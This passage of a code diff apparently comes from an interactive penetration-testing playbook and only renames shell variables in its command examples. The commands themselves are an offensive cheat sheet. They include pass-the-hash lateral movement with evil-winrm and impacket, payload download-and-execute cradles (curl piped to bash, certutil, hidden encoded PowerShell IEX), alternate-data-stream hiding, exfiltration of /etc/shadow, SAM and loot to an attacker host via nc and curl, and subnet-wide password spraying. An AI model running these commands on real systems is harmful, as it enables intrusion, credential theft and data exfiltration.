 .\\sh.exe -c All --zipfilename bh.zip
 
 # Start BloodHound
@@ -7584,25 +7643,25 @@ Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
     title: "Lateral Movement",
     body: "Move between machines with creds, hashes, or Kerberos tickets. impacket suite covers everything — no MSF console needed.",
     cmd: `# evil-winrm (WinRM 5985/5986)
-evil-winrm -i $TARGET -u admin -p 'pass'
-evil-winrm -i $TARGET -u admin -H NTLM_HASH
+evil-winrm -i $target -u admin -p 'pass'
+evil-winrm -i $target -u admin -H NTLM_HASH
 
 # psexec (requires admin + file write to ADMIN$)
-impacket-psexec domain/admin:'pass'@$TARGET
-impacket-psexec domain/admin@$TARGET -hashes :NTLM_HASH
+impacket-psexec domain/admin:'pass'@$target
+impacket-psexec domain/admin@$target -hashes :NTLM_HASH
 
 # wmiexec (stealthier — no service creation)
-impacket-wmiexec domain/admin:'pass'@$TARGET
+impacket-wmiexec domain/admin:'pass'@$target
 
 # smbexec
-impacket-smbexec domain/admin:'pass'@$TARGET
+impacket-smbexec domain/admin:'pass'@$target
 
 # Pass-the-ticket
 export KRB5CCNAME=ticket.ccache
 impacket-psexec -k -no-pass domain/admin@dc01.domain.com
 
 # PowerShell remoting
-Enter-PSSession -ComputerName $TARGET -Credential domain\\admin`,
+Enter-PSSession -ComputerName $target -Credential domain\\admin`,
     warn: null,
     choices: [
       { label: "On DC — DCSync everything", next: "dcsync" },
@@ -7803,23 +7862,23 @@ impacket-smbserver share /path/to/tools -smb2support -username user -password pa
 
 # -- LINUX: DOWNLOAD TO TARGET -------------
 # wget — most common on Linux targets
-wget http://$LHOST/linpeas.sh -O /tmp/lp.sh          # rename output
-wget -q http://$LHOST/shell.elf -O /tmp/s             # quiet, short name
-wget --no-check-certificate https://$LHOST/shell.elf -O /tmp/s  # ignore SSL
-wget -c http://$LHOST/bigfile.tar.gz -O /tmp/f.tgz   # resume interrupted
-wget -b http://$LHOST/linpeas.sh -O /tmp/lp.sh        # background download
-wget --user=user --password=pass http://$LHOST/file   # authenticated
+wget http://$lhost/linpeas.sh -O /tmp/lp.sh          # rename output
+wget -q http://$lhost/shell.elf -O /tmp/s             # quiet, short name
+wget --no-check-certificate https://$lhost/shell.elf -O /tmp/s  # ignore SSL
+wget -c http://$lhost/bigfile.tar.gz -O /tmp/f.tgz   # resume interrupted
+wget -b http://$lhost/linpeas.sh -O /tmp/lp.sh        # background download
+wget --user=user --password=pass http://$lhost/file   # authenticated
 # POST request via wget
 wget --post-data="cmd=id" http://$ip/exec.php -O -
 
 # curl — fallback if wget missing
-curl http://$LHOST/linpeas.sh -o /tmp/lp.sh
-curl -k https://$LHOST/shell.elf -o /tmp/s            # ignore SSL
-curl http://$LHOST/shell.elf | bash                   # fileless — never touches disk
+curl http://$lhost/linpeas.sh -o /tmp/lp.sh
+curl -k https://$lhost/shell.elf -o /tmp/s            # ignore SSL
+curl http://$lhost/shell.elf | bash                   # fileless — never touches disk
 
 # nc transfer (no HTTP available)
 # Attacker: nc -nlvp 4444 < file.sh
-# Target:   nc $LHOST 4444 > /tmp/file.sh
+# Target:   nc $lhost 4444 > /tmp/file.sh
 
 # base64 transfer (no network tools)
 # Attacker: base64 -w0 linpeas.sh
@@ -7835,17 +7894,17 @@ scp linpeas.sh user@$ip:/tmp/lp.sh
 #        C:\Windows\SysWOW64\certutil.exe
 
 # Standard download — saves to current folder
-certutil.exe -urlcache -f http://$LHOST/shell.exe shell.exe
+certutil.exe -urlcache -f http://$lhost/shell.exe shell.exe
 
 # -split avoids caching (cleaner, less artifacts)
-certutil.exe -urlcache -split -f http://$LHOST/shell.exe C:\Windows\Temp\shell.exe
+certutil.exe -urlcache -split -f http://$lhost/shell.exe C:\Windows\Temp\shell.exe
 
 # verifyctl — alternate download method, same result
-certutil.exe -verifyctl -f http://$LHOST/shell.exe shell.exe
+certutil.exe -verifyctl -f http://$lhost/shell.exe shell.exe
 
 # Save to Alternate Data Stream (ADS) — hides from dir listing
 # T1564.004: NTFS File Attributes
-certutil.exe -urlcache -f http://$LHOST/shell.ps1 C:\Windows\Temp\legit.txt:hidden
+certutil.exe -urlcache -f http://$lhost/shell.ps1 C:\Windows\Temp\legit.txt:hidden
 
 # -- certutil encode/decode (T1027.013 / T1140) ---
 # Encode a file to base64 — useful for exfil or transfer
@@ -7861,35 +7920,35 @@ certutil -decodehex shell.hex C:\Windows\Temp\shell.exe
 certutil -hashfile C:\Windows\Temp\shell.exe MD5
 
 # PowerShell DownloadFile
-powershell -c "(New-Object Net.WebClient).DownloadFile('http://$LHOST/shell.exe','C:\Windows\Temp\shell.exe')"
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://$lhost/shell.exe','C:\Windows\Temp\shell.exe')"
 
 # PowerShell DownloadString (fileless — runs in memory)
-powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')"
 
 # bitsadmin (older Windows)
-bitsadmin /transfer job http://$LHOST/shell.exe C:\Windows\Temp\shell.exe
+bitsadmin /transfer job http://$lhost/shell.exe C:\Windows\Temp\shell.exe
 
 # SMB copy (no HTTP needed — use impacket-smbserver)
-copy \\$LHOST\share\shell.exe C:\Windows\Temp\shell.exe
+copy \\$lhost\share\shell.exe C:\Windows\Temp\shell.exe
 # Or in PowerShell:
-Copy-Item \\$LHOST\share\shell.exe C:\Windows\Temp\shell.exe
+Copy-Item \\$lhost\share\shell.exe C:\Windows\Temp\shell.exe
 
 # curl (Windows 10+)
-curl http://$LHOST/shell.exe -o C:\Windows\Temp\shell.exe
+curl http://$lhost/shell.exe -o C:\Windows\Temp\shell.exe
 
 # wget (Windows 10+ — PowerShell alias for Invoke-WebRequest)
-wget http://$LHOST/shell.exe -OutFile C:\Windows\Temp\shell.exe
+wget http://$lhost/shell.exe -OutFile C:\Windows\Temp\shell.exe
 # or explicitly:
-powershell -c "wget http://$LHOST/shell.exe -OutFile C:\Windows\Temp\shell.exe"
+powershell -c "wget http://$lhost/shell.exe -OutFile C:\Windows\Temp\shell.exe"
 # ignore SSL:
-powershell -c "wget https://$LHOST/shell.exe -OutFile C:\Windows\Temp\shell.exe -SkipCertificateCheck"
+powershell -c "wget https://$lhost/shell.exe -OutFile C:\Windows\Temp\shell.exe -SkipCertificateCheck"
 
 # -- WINDOWS: EXECUTE IN MEMORY ------------
 # PS DownloadString — never touches disk
-powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-PowerShellTcp.ps1')"
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://$lhost/Invoke-PowerShellTcp.ps1')"
 
 # Encoded download cradle
-CMD = "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"
+CMD = "IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')"
 echo CMD | iconv -t UTF-16LE | base64 -w0
 powershell -nop -w hidden -enc [OUTPUT]
 
@@ -7941,8 +8000,8 @@ echo "BASE64STRING" | base64 -d > C:\\Windows\\Temp\\tool.exe
 nc -nlvp 4444 < tool.exe
 
 # Target — receive file
-nc $LHOST 4444 > /tmp/tool
-nc.exe $LHOST 4444 > C:\\Windows\\Temp\\tool.exe
+nc $lhost 4444 > /tmp/tool
+nc.exe $lhost 4444 > C:\\Windows\\Temp\\tool.exe
 
 # ── VERIFY INTEGRITY ──────────────────────────────────
 # Linux
@@ -7964,17 +8023,17 @@ Get-FileHash C:\\Windows\\Temp\\tool.exe -Algorithm MD5`,
     title: "File Transfer — Windows (Download Tools)",
     body: "Get tools onto a Windows target. iwr and certutil are your defaults. SMB is the most reliable when HTTP is blocked.",
     cmd: `# ── IWR / INVOKE-WEBREQUEST (PowerShell) ─────────────
-iwr http://$LHOST/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe
-iwr http://$LHOST/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe
+iwr http://$lhost/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe
+iwr http://$lhost/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe
 Unblock-File C:\\Windows\\Temp\\wp.exe
 
 # In-memory (never touches disk — best for AV evasion)
-IEX(New-Object Net.WebClient).DownloadString("http://$LHOST/PowerUp.ps1")
-(new-object net.webclient).downloadstring("http://$LHOST/PrivescCheck.ps1") | iex
+IEX(New-Object Net.WebClient).DownloadString("http://$lhost/PowerUp.ps1")
+(new-object net.webclient).downloadstring("http://$lhost/PrivescCheck.ps1") | iex
 
 # ── CERTUTIL (LOLBin — built-in) ─────────────────────
-certutil -urlcache -split -f http://$LHOST/shell.exe C:\\Windows\\Temp\\shell.exe
-certutil -urlcache -split -f http://$LHOST/shell.exe shell.exe
+certutil -urlcache -split -f http://$lhost/shell.exe C:\\Windows\\Temp\\shell.exe
+certutil -urlcache -split -f http://$lhost/shell.exe shell.exe
 # Encode/decode (useful if direct download blocked)
 certutil -encode C:\\Windows\\Temp\\file.exe file.b64
 certutil -decode file.b64 C:\\Windows\\Temp\\file.exe
@@ -7984,19 +8043,19 @@ certutil -decode file.b64 C:\\Windows\\Temp\\file.exe
 # impacket-smbserver -smb2support kali . -username user -password pass
 
 # Target — map drive and copy
-net use m: \\\\$LHOST\\kali /user:user pass
-copy \\\\$LHOST\\kali\\shell.exe C:\\Windows\\Temp\\shell.exe
+net use m: \\\\$lhost\\kali /user:user pass
+copy \\\\$lhost\\kali\\shell.exe C:\\Windows\\Temp\\shell.exe
 # Or just run directly from share:
-\\\\$LHOST\\kali\\shell.exe
+\\\\$lhost\\kali\\shell.exe
 
 # Disconnect when done
 net use m: /delete
 
 # ── BITSADMIN (background, survives logoff) ───────────
-bitsadmin /transfer job http://$LHOST/shell.exe C:\\Windows\\Temp\\shell.exe
+bitsadmin /transfer job http://$lhost/shell.exe C:\\Windows\\Temp\\shell.exe
 
 # ── CURL (Windows 10+) ───────────────────────────────
-curl http://$LHOST/shell.exe -o C:\\Windows\\Temp\\shell.exe
+curl http://$lhost/shell.exe -o C:\\Windows\\Temp\\shell.exe
 
 # ── BASE64 PASTE (no outbound network) ───────────────
 # Attacker: base64 -w0 tool.exe
@@ -8021,20 +8080,20 @@ Remove-Item -Path C:\\Windows\\Temp\\tool.exe -Stream Zone.Identifier -ErrorActi
     title: "File Transfer — Linux (Download Tools)",
     body: "Get tools onto a Linux target. wget is usually available. curl as fallback. nc/base64 when nothing else works.",
     cmd: `# ── WGET ─────────────────────────────────────────────
-wget http://$LHOST/linpeas.sh -O /tmp/lp.sh
-wget -q http://$LHOST/linpeas.sh -O /tmp/lp.sh     # quiet
-wget -c http://$LHOST/bigfile -O /tmp/file           # resume
-wget --no-check-certificate https://$LHOST/file -O /tmp/file  # ignore SSL
+wget http://$lhost/linpeas.sh -O /tmp/lp.sh
+wget -q http://$lhost/linpeas.sh -O /tmp/lp.sh     # quiet
+wget -c http://$lhost/bigfile -O /tmp/file           # resume
+wget --no-check-certificate https://$lhost/file -O /tmp/file  # ignore SSL
 chmod +x /tmp/lp.sh && /tmp/lp.sh
 
 # ── CURL ─────────────────────────────────────────────
-curl http://$LHOST/linpeas.sh -o /tmp/lp.sh
-curl -k https://$LHOST/linpeas.sh -o /tmp/lp.sh     # ignore SSL
+curl http://$lhost/linpeas.sh -o /tmp/lp.sh
+curl -k https://$lhost/linpeas.sh -o /tmp/lp.sh     # ignore SSL
 chmod +x /tmp/lp.sh
 
 # Fileless — run in memory (never touches disk)
-curl http://$LHOST/linpeas.sh | bash
-curl http://$LHOST/linpeas.sh | sh
+curl http://$lhost/linpeas.sh | bash
+curl http://$lhost/linpeas.sh | sh
 
 # ── SCP ───────────────────────────────────────────────
 # Push from Kali to target (if SSH available)
@@ -8045,15 +8104,15 @@ scp -r tools/ user@$ip:/tmp/tools/
 scp user@$ip:/tmp/loot.txt ~/loot.txt
 
 # ── PYTHON ───────────────────────────────────────────
-python3 -c "import urllib.request; urllib.request.urlretrieve('http://$LHOST/lp.sh', '/tmp/lp.sh')"
-python2 -c "import urllib; urllib.urlretrieve('http://$LHOST/lp.sh', '/tmp/lp.sh')"
+python3 -c "import urllib.request; urllib.request.urlretrieve('http://$lhost/lp.sh', '/tmp/lp.sh')"
+python2 -c "import urllib; urllib.urlretrieve('http://$lhost/lp.sh', '/tmp/lp.sh')"
 
 # ── BASH /DEV/TCP (no tools available) ───────────────
-bash -c "exec 3<>/dev/tcp/$LHOST/80; echo -e 'GET /lp.sh HTTP/1.0\r\n\r\n' >&3; cat <&3" > /tmp/lp.sh
+bash -c "exec 3<>/dev/tcp/$lhost/80; echo -e 'GET /lp.sh HTTP/1.0\r\n\r\n' >&3; cat <&3" > /tmp/lp.sh
 
 # ── NC ────────────────────────────────────────────────
 # Attacker: nc -nlvp 4444 < linpeas.sh
-nc $LHOST 4444 > /tmp/lp.sh
+nc $lhost 4444 > /tmp/lp.sh
 chmod +x /tmp/lp.sh
 
 # ── WRITABLE DIRS ────────────────────────────────────
@@ -8062,7 +8121,7 @@ chmod +x /tmp/lp.sh
 /dev/shm/      # RAM-based, fast, often overlooked
 /var/tmp/      # persists across reboots
 /run/          # tmpfs on modern Linux
-cd /dev/shm && wget http://$LHOST/lp.sh -O lp.sh && chmod +x lp.sh && ./lp.sh`,
+cd /dev/shm && wget http://$lhost/lp.sh -O lp.sh && chmod +x lp.sh && ./lp.sh`,
     warn: "If /tmp is mounted noexec, use /dev/shm or /var/tmp. Always chmod +x after download. If the file runs but does nothing, check if it downloaded completely — partial downloads are silent failures.",
     choices: [
       { label: "Exfiltrate data back to Kali", next: "transfer_exfil" },
@@ -8081,7 +8140,7 @@ cd /dev/shm && wget http://$LHOST/lp.sh -O lp.sh && chmod +x lp.sh && ./lp.sh`,
 impacket-smbserver -smb2support kali . -username user -password pass
 
 # Target (Windows):
-net use m: \\\\$LHOST\\kali /user:user pass
+net use m: \\\\$lhost\\kali /user:user pass
 copy PrivescCheck_*.* m:\\
 copy winpeas.txt m:\\
 copy sam m:\\
@@ -8093,23 +8152,23 @@ net use m: /delete
 pip3 install uploadserver
 python3 -m uploadserver 80
 # Target:
-Invoke-RestMethod -Uri "http://$LHOST/upload" -Method Post -InFile C:\\Windows\\Temp\\loot.txt
+Invoke-RestMethod -Uri "http://$lhost/upload" -Method Post -InFile C:\\Windows\\Temp\\loot.txt
 
 # nc exfil
 # Attacker: nc -nlvp 4444 > loot.txt
 # Target:
-type C:\\Windows\\Temp\\loot.txt | nc $LHOST 4444
+type C:\\Windows\\Temp\\loot.txt | nc $lhost 4444
 
 # ── LINUX EXFIL ───────────────────────────────────────
 # curl POST file to Kali
 # Attacker: python3 -m uploadserver 80
-curl -X POST http://$LHOST/upload -F "file=@/tmp/loot.txt"
-curl --upload-file /etc/passwd http://$LHOST/passwd
+curl -X POST http://$lhost/upload -F "file=@/tmp/loot.txt"
+curl --upload-file /etc/passwd http://$lhost/passwd
 
 # nc pipe out
 # Attacker: nc -nlvp 4444 > loot.txt
-nc $LHOST 4444 < /tmp/loot.txt
-cat /etc/shadow | nc $LHOST 4444
+nc $lhost 4444 < /tmp/loot.txt
+cat /etc/shadow | nc $lhost 4444
 
 # SCP pull from Kali (if SSH available on target)
 scp user@$ip:/etc/shadow ~/shadow
@@ -8117,7 +8176,7 @@ scp user@$ip:/tmp/linpeas_output.txt ~/loot/
 
 # tar + nc (entire directory)
 # Attacker: nc -nlvp 4444 | tar xvf -
-tar czf - /tmp/loot/ | nc $LHOST 4444
+tar czf - /tmp/loot/ | nc $lhost 4444
 
 # ── BOTH OS — BASE64 ENCODE AND PASTE ────────────────
 # Small files — encode on target, paste into terminal
@@ -8130,7 +8189,7 @@ pip3 install uploadserver
 # Run:
 python3 -m uploadserver 80
 # Then from target:
-curl -X POST http://$LHOST/upload -F "file=@/path/to/file"
+curl -X POST http://$lhost/upload -F "file=@/path/to/file"
 # Files land in current dir on Kali`,
     warn: null,
     choices: [
@@ -8166,8 +8225,8 @@ nxc ftp   $ip -u USER -p PASS
 nxc mssql $ip -u USER -p PASS
 
 # Spray across subnet
-nxc smb $SUBNET/24 -u USER -p PASS --continue-on-success
-nxc smb $SUBNET/24 -u USER -H HASH --continue-on-success
+nxc smb $subnet/24 -u USER -p PASS --continue-on-success
+nxc smb $subnet/24 -u USER -H HASH --continue-on-success
 
 # crackmapexec fallback (identical syntax)
 crackmapexec smb $ip -u USER -p PASS
